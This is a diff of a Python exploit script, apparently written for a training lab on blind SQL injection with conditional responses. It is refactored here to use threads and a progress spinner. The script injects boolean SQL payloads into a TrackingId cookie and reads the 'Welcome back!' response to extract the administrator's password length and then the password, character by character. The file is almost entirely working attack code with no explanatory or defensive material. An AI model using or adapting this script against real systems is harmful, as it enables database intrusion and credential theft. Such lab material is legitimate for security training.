@@ -1,16 +1,10 @@
+import threading
 import requests
 import string
 import sys
-import os
 import urllib.parse
 import getopt
-
-
-def clear_screen():
-  if os.name == 'posix':
-    os.system('clear')
-  else:
-    os.system('cls')
+from halo import Halo
 
 
 def get_password_length(url, trackingId, session):
@@ -20,70 +14,64 @@ def get_password_length(url, trackingId, session):
   while True:
     payload = f"' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) = 'a"
     payload = urllib.parse.quote_plus(payload)
-    cookies = {
-      "TrackingId": trackingId + payload,
-      "session": session
-      }
+    cookies = {"TrackingId": trackingId + payload, "session": session}
     r = requests.get(url, cookies=cookies)
 
     if "Welcome back!" not in r.text:
-      clear_screen()
-      print(f"[*] The password length is {password_length} characters long")
       return password_length
     else:
-      clear_screen()
-      print(f"[-] The password length is {password_length} characters long")
       i += 1
       password_length += 1
 
 
-
 def get_password(password_length, url, trackingId, session):
   characters = string.ascii_lowercase + string.digits
-  password = ""
-  message = "[-] The password for 'administrator' is: "
-  clear_screen()
-  print(message, end='', flush=True)
+  valid_password = []
+  threads = []
+
+  def test_password(i, character):
+      payload = f"'AND (SELECT SUBSTRING(password, {i + 1}, 1) FROM users WHERE username = 'administrator') = '{character}"
+      payload = urllib.parse.quote_plus(payload)
+      cookies = {"TrackingId": trackingId + payload, "session": session}
+      response = requests.get(url, cookies=cookies)
+
+      if "Welcome back!" in response.text:
+        valid_password.append(character)
 
   for i in range(password_length):
-    for x in characters:
-      payload = f"'AND (SELECT SUBSTRING(password, {i + 1}, 1) FROM users WHERE username = 'administrator') = '{x}"
-      payload = urllib.parse.quote_plus(payload)
-      cookies = {
-        "TrackingId": trackingId + payload,
-        "session": session
-        }
-      r = requests.get(url, cookies=cookies)
+    for character in characters:
+      t = threading.Thread(target=test_password, args=(i, character))
+      threads.append(t)
 
-      if "Welcome back!" in r.text:
-        password += x
-        print(x, end='', flush=True)
-        break
-  clear_screen()
+    for x in threads:
+      x.start() 
 
-  return f"[*] The password for 'administrator' is: {password}"
+    for x in threads:
+      x.join()
+    threads = []
+
+  password = "".join(valid_password)
+  return password
 
 
 def get_cookie(url):
   session = requests.Session()
-  if session.get(url).status_code != 200 :
-    sys.exit("[!] Error. Status code is not '200'")
-
   response = session.get(url)
   cookies = session.cookies.get_dict()
   values = list(cookies.values())
   trackingId = values[0]
   session = values[1]
-
   return trackingId, session 
 
 
 def main(argv):
+  help_message = "This is the script for:\n'Blind SQL injection with conditional responses'\n\nUsage: python3 bsqli-1.py -u <url>"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Blind SQL injection with conditional responses'\n\nUsage: python3 bsqli-1.py -u <url>")
-    print("\x1b[?25h")
+    print(help_message) 
+    print("\x1b[?25h", end="") # Make cursor visible 
     sys.exit(2)
 
   for opt, arg in opts:
@@ -91,18 +79,28 @@ def main(argv):
       url = arg
       trackingId, session = get_cookie(url)
     elif opt == "-h":
-      print("This is the script for:\n'Blind SQL injection with conditional responses'\n\nUsage: python3 bsqli-1.py -u <url>")
-      print("\x1b[?25h")
+      print(help_message) 
+      print("\x1b[?25h", end="") # Make cursor visible 
       sys.exit()
-  password_length = get_password_length(url, trackingId, session)
-  password = get_password(password_length, url, trackingId, session)
-  print(password)
 
+  # Create and start spinner animation
+  spinner = Halo(text="Getting password length...", spinner="bouncingBar")
+  spinner.start()
+  # Get valid username
+  password_length = get_password_length(url, trackingId, session)
+  # Finish spinner
+  spinner.succeed(f"The password length is: \"{password_length}\"")
+
+  # Create and start spinner animation
+  spinner = Halo(text="Getting password...", spinner="bouncingBar")
+  spinner.start()
+  # Get valid password
+  password = get_password(password_length, url, trackingId, session)
+  # Finish spinner
+  spinner.succeed(f"The password is: \"{password}\"")
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
